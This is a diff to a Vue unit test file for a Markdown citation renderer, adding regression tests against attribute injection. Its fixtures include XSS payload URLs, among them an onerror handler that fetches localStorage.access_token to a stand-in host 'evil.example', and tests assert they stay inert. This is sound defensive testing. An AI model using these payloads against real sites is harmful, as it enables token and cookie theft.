@@ -4,10 +4,14 @@ import { mount } from "@vue/test-utils";
 
 import { i18n } from "@/i18n";
 import MarkdownView from "./MarkdownView.vue";
-import type { SourcePreview } from "@/lib/types";
+import type { CitationGround, SourcePreview } from "@/lib/types";
 
-function render(source: string, sources?: SourcePreview[]) {
-  return mount(MarkdownView, { props: { source, sources }, global: { plugins: [i18n] } });
+function render(
+  source: string,
+  sources?: SourcePreview[],
+  extra: { grounding?: CitationGround[]; verify?: boolean } = {},
+) {
+  return mount(MarkdownView, { props: { source, sources, ...extra }, global: { plugins: [i18n] } });
 }
 
 function citationHrefs(wrapper: ReturnType<typeof render>): Record<string, string | null> {
@@ -16,8 +20,18 @@ function citationHrefs(wrapper: ReturnType<typeof render>): Record<string, strin
   return out;
 }
 
+// Every event-handler attribute (onerror, onmouseover, …) anywhere in the rendered DOM.
+function eventHandlers(wrapper: ReturnType<typeof render>): string[] {
+  const root = wrapper.element as Element;
+  return Array.from(root.querySelectorAll<Element>("*")).flatMap((el) =>
+    Array.from(el.attributes)
+      .filter((a) => /^on/i.test(a.name))
+      .map((a) => `${el.tagName.toLowerCase()}[${a.name}]`),
+  );
+}
+
 describe("MarkdownView citations", () => {
-  it("links [Sn] to the explicit source map and escapes attribute-breaking URLs", () => {
+  it("links [Sn] to the explicit source map and percent-encodes attribute-breaking URLs", () => {
     const wrapper = render("Claim one [S1]. Claim two [S2].", [
       { source_id: "S1", url: "https://one.example/a" },
       { source_id: "S2", url: 'https://two.example/"onmouseover="x' },
@@ -30,9 +44,9 @@ describe("MarkdownView citations", () => {
       target: "_blank",
       rel: "noopener noreferrer",
     });
-    // The quote stays inside href — no injected event-handler attribute.
-    expect(links[1].attributes("href")).toBe('https://two.example/"onmouseover="x');
-    expect(links[1].attributes("onmouseover")).toBeUndefined();
+    // The quote is percent-encoded inside href — no injected event-handler attribute.
+    expect(links[1].attributes("href")).toBe("https://two.example/%22onmouseover=%22x");
+    expect(eventHandlers(wrapper)).toEqual([]);
   });
 
   it("renders a citation without a known URL as plain text, never as a link", () => {
@@ -60,5 +74,58 @@ describe("MarkdownView citations", () => {
       "[S1]": "https://stats.example/table",
       "[S2]": "https://two.example/b",
     });
+  });
+
+  // [Sn] inside an attribute value (image alt, link title) must stay plain text: turning it
+  // into <a href="…"> there closes the attribute and lets the URL add event handlers.
+  const EVIL_TEXT_URL = "https://x.example/p/onerror=alert`1`//";
+  const EVIL_EXPLICIT_URL = "https://evil.example/p/onerror=fetch('//evil.example/'+localStorage.access_token)//";
+
+  it.each<[string, string, SourcePreview[] | undefined]>([
+    ["image alt, URL from the report text", `- [S9] (${EVIL_TEXT_URL})\n\nIntro ![[S9]](https://nope.invalid/a.png)`, undefined],
+    [
+      "link title, URL from the report text",
+      '[S4] https://x.example/p/onmouseover=alert`document.cookie`//\n\nRead [more](https://ok.example "[S4]").',
+      undefined,
+    ],
+    ["link title, explicit source URL", 'See [here](https://ok.example "[S1]") now.', [{ source_id: "S1", url: EVIL_EXPLICIT_URL }]],
+    ["image alt, explicit source URL", "Chart ![[S1]](https://nope.invalid/a.png)", [{ source_id: "S1", url: EVIL_EXPLICIT_URL }]],
+  ])("never rewrites a citation inside an attribute (%s)", (_name, source, sources) => {
+    const wrapper = render(source, sources);
+
+    expect(eventHandlers(wrapper)).toEqual([]);
+    const img = wrapper.find("img");
+    if (img.exists()) expect(img.attributes("alt")).toMatch(/^\[S\d\]$/);
+    const titled = wrapper.find("a[title]");
+    if (titled.exists()) expect(titled.attributes("title")).toMatch(/^\[S\d\]$/);
+  });
+
+  it("keeps attributes intact in verify mode and with a grounding URL", () => {
+    const wrapper = render(
+      "Intro text here ![[S2]. Next claim](https://nope.invalid/a.png) and more [S2]. Another [S2].",
+      undefined,
+      {
+        verify: true,
+        grounding: [{ source_id: "S2", url: EVIL_EXPLICIT_URL, title: "t", quote: "q", supported: true }],
+      },
+    );
+
+    expect(eventHandlers(wrapper)).toEqual([]);
+    // Neither a citation link nor a claim-band span lands inside the alt text.
+    expect(wrapper.find("img").attributes("alt")).toBe("[S2]. Next claim");
+    // Body citations still link, to the percent-encoded grounding URL.
+    expect(wrapper.find("a.md-citation").attributes("href")).toBe(
+      "https://evil.example/p/onerror=fetch(%27//evil.example/%27+localStorage.access_token)//",
+    );
+    expect(wrapper.findAll(".md-claim").length).toBeGreaterThan(0);
+  });
+
+  it("drops the link for a URL that does not parse as http(s)", () => {
+    const wrapper = render("Claim [S1]. Other [S2].", [
+      { source_id: "S1", url: "https://" },
+      { source_id: "S2", url: "https://ok.example/a b" },
+    ]);
+
+    expect(citationHrefs(wrapper)).toEqual({ "[S1]": null, "[S2]": "https://ok.example/a%20b" });
   });
 });
